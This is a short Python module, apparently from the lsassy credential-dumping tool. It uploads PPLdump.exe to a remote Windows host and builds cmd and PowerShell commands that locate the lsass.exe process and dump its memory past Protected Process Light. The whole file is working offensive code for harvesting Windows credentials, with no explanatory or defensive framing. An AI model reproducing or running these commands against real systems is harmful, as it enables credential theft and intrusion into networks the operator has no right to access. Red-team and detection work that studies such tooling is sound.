"""
https://github.com/itm4n/PPLdump
"""

from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.ppldump = Dependency("ppldump", "PPLdump.exe")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.ppldump])

    def clean(self):
        self.clean_dependencies([self.ppldump])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {} %J {}{}""".format(
            self.ppldump.get_remote_path(),
            self.dump_path, self.dump_name
        )
        pwsh_command = """{} (Get-Process lsass).Id {}{}""".format(
            self.ppldump.get_remote_path(),
            self.dump_path, self.dump_name
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
